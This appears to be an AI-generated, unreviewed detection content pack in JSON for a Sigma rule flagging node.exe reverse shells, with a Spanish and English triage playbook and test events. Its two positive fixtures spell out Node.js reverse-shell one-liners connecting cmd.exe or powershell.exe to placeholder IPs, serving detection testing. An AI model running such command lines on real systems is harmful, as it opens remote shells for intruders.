@@ -1,0 +1,130 @@
+{
+  "rule": {
+    "id": "6640f31c-01ad-49b5-beb5-83498a5cd8bd",
+    "title": "Potential Arbitrary Code Execution Via Node.EXE",
+    "level": "high",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_node_abuse.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_node_abuse.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1127"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó node.exe con código en línea (-e/--eval) que usa child_process, net.Socket, .connect y .exec(, el patrón típico de una reverse shell en JavaScript.",
+      "what_it_detects": "Creación de procesos en Windows donde Image termina en \\node.exe y CommandLine contiene ' -e ' o ' --eval ' junto con '.exec(', 'net.socket', '.connect' y 'child_process'. Las coincidencias de texto no distinguen mayúsculas de minúsculas.",
+      "why_it_matters": "Muchos productos, como VMware Horizon o Adobe, incluyen node.exe, que un atacante puede usar como binario confiable para ejecutar código arbitrario (T1127, Trusted Developer Utilities Proxy Execution). Las referencias de la regla describen este abuso tras explotar Log4j en VMware Horizon para abrir reverse shells con privilegios del servicio.",
+      "triage_steps": [
+        "Revisa el CommandLine completo y extrae la IP o dominio y el puerto pasados a .connect(), además del comando lanzado con .exec() (por ejemplo cmd.exe o powershell.exe).",
+        "Valida la ruta de Image: identifica qué producto instaló ese node.exe (VMware, Adobe u otro) y si la ruta y el hash corresponden a la versión legítima.",
+        "Analiza ParentImage y el usuario: un servicio Java/Tomcat o un componente de VMware Horizon como padre sugiere explotación de una aplicación expuesta.",
+        "Busca conexiones de red salientes desde node.exe hacia el destino extraído en el mismo host, +/- 15 minutos, en los logs de firewall, proxy o EDR.",
+        "Enumera los procesos hijos de node.exe (cmd.exe, powershell.exe, whoami, net.exe) y los comandos que ejecutaron después.",
+        "Consulta los logs de la aplicación web del host por cadenas de explotación (por ejemplo ${jndi:) en la misma ventana de tiempo.",
+        "Revisa si hay alertas previas para el mismo host, usuario o IP de destino, y si el mismo CommandLine aparece en otros equipos."
+      ],
+      "false_positives": [
+        "La regla indica que son improbables; puede tratarse de un ejercicio de red team o pentest autorizado que usa node -e para una reverse shell.",
+        "Un desarrollador o administrador que prueba sockets y child_process con un one-liner de depuración; confirma con el responsable y el ticket de cambio."
+      ],
+      "response_steps": [
+        "Confirma con el dueño del sistema que no hay pruebas autorizadas; si no las hay, trata el evento como compromiso activo.",
+        "Aísla el endpoint desde el EDR y bloquea la IP o dominio de destino en el perímetro.",
+        "Termina el proceso node.exe y sus hijos después de preservar memoria, CommandLine y artefactos relevantes.",
+        "Identifica el vector de entrada (por ejemplo Log4j en VMware Horizon), aplica los parches y busca persistencia como cuentas nuevas, servicios o tareas programadas.",
+        "Rota las credenciales de la cuenta del servicio afectado y recupera el host desde una imagen confiable si se confirma la intrusión."
+      ],
+      "severity_rationale": "El nivel high es adecuado porque la combinación de código en línea, sockets de red y ejecución de comandos casi no tiene uso legítimo y suele indicar una reverse shell activa."
+    },
+    "en": {
+      "summary": "node.exe ran inline code (-e/--eval) that uses child_process, net.Socket, .connect and .exec(, the typical pattern of a JavaScript reverse shell.",
+      "what_it_detects": "Windows process creation where Image ends with \\node.exe and CommandLine contains ' -e ' or ' --eval ' along with '.exec(', 'net.socket', '.connect' and 'child_process'. String matching is case-insensitive.",
+      "why_it_matters": "Many products, such as VMware Horizon and Adobe, ship node.exe, which attackers can use as a trusted binary to run arbitrary code (T1127, Trusted Developer Utilities Proxy Execution). The rule's references describe this abuse after Log4j exploitation of VMware Horizon, where it opened reverse shells with service privileges.",
+      "triage_steps": [
+        "Read the full CommandLine. Extract the IP or domain and port passed to .connect() and the command launched by .exec() (for example cmd.exe or powershell.exe).",
+        "Validate the Image path: find out which product installed this node.exe (VMware, Adobe or other) and whether its path and hash match the legitimate build.",
+        "Check ParentImage and the user. A Java/Tomcat service or a VMware Horizon component as parent points to exploitation of an exposed application.",
+        "Look for outbound connections from node.exe to the extracted destination on the same host, +/- 15 minutes, in firewall, proxy or EDR logs.",
+        "List node.exe child processes (cmd.exe, powershell.exe, whoami, net.exe) and the commands they ran afterwards.",
+        "Search the host's web application logs for exploit strings (for example ${jndi:) in the same time window.",
+        "Check for earlier alerts on the same host, user or destination IP, and whether the same CommandLine appears on other machines."
+      ],
+      "false_positives": [
+        "The rule rates false positives as unlikely. An authorized red team exercise or pentest may use node -e for a reverse shell.",
+        "A developer or admin may be testing sockets and child_process with a debugging one-liner. Confirm with the owner and the change ticket."
+      ],
+      "response_steps": [
+        "Ask the system owner whether any authorized testing is running. If none is, treat the event as an active compromise.",
+        "Isolate the endpoint through EDR and block the destination IP or domain at the perimeter.",
+        "Preserve memory, the CommandLine and related artifacts, then kill node.exe and its child processes.",
+        "Find the entry vector (for example Log4j in VMware Horizon), patch it, and hunt for persistence such as new accounts, services or scheduled tasks.",
+        "Rotate credentials for the affected service account. If the intrusion is confirmed, rebuild the host from a trusted image."
+      ],
+      "severity_rationale": "High fits because inline code that combines network sockets with command execution has almost no legitimate use and usually means a live reverse shell."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "VMware Horizon bundled node.exe spawned by Tomcat running an inline reverse shell via -e",
+        "event": {
+          "EventID": 1,
+          "Computer": "HZN-CS-01.andes.example.com",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "Image": "C:\\Program Files\\VMware\\VMware View\\Server\\appblastgateway\\node.exe",
+          "CommandLine": "\"C:\\Program Files\\VMware\\VMware View\\Server\\appblastgateway\\node.exe\" -r net -e \"var sh = require('child_process').exec('cmd.exe'); var client = new net.Socket(); client.connect(4444, '203.0.113.10');\"",
+          "ParentImage": "C:\\Program Files\\VMware\\VMware View\\Server\\jre\\bin\\ws_TomcatService.exe",
+          "ProcessId": 6120
+        }
+      },
+      {
+        "description": "node.exe using --eval with child_process exec and net.Socket connect",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Program Files\\Adobe\\Adobe Creative Cloud Experience\\libs\\node.exe",
+          "CommandLine": "node.exe --eval \"const net=require('net');require('child_process').exec('powershell.exe');new net.Socket().connect(443,'198.51.100.25')\"",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ProcessId": 4388
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Inline eval that only prints the Node version; no reverse shell indicators",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Program Files\\nodejs\\node.exe",
+          "CommandLine": "node.exe -e \"console.log(process.version)\"",
+          "ParentImage": "C:\\Program Files\\Microsoft VS Code\\Code.exe",
+          "ProcessId": 5012
+        }
+      },
+      {
+        "description": "Build script using child_process exec inline but without net.Socket or .connect",
+        "event": {
+          "EventID": 1,
+          "Computer": "BUILD-07",
+          "User": "ANDES\\svc_build",
+          "Image": "C:\\Program Files\\nodejs\\node.exe",
+          "CommandLine": "node.exe -e \"require('child_process').exec('npm --version')\"",
+          "ParentImage": "C:\\Program Files\\Git\\bin\\bash.exe",
+          "ProcessId": 7256
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
